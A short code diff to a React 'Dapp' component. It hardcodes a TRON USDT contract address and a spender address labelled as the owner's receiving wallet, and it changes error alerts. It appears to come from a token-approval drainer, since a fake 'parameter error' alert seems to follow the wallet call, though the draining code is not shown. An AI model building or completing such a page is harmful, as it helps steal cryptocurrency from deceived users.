@@ -8,7 +8,7 @@ export default function Dapp() {
 
   const [walletAddress, setWalletAddress] = useState("");
 
-  const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 官方USDT合约地址
+  const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT合约地址
   const SPENDER_ADDRESS = "TD6BbmRVVMu1kG4zBHqvrp8dySR4NkHKer"; // 你的收款地址
 
   useEffect(() => {
@@ -53,10 +53,12 @@ export default function Dapp() {
         alert("参数错误！");
       }, 500);
     } catch (error) {
-      console.error("出现异常：", error);
-      setTimeout(() => {
-        alert("参数错误！");
-      }, 500);
+      console.error("捕获到错误:", error);
+      if (error && error.message) {
+        alert(`捕获到异常: ${error.message}`);
+      } else {
+        alert("捕获到未知异常！");
+      }
     }
   };
 
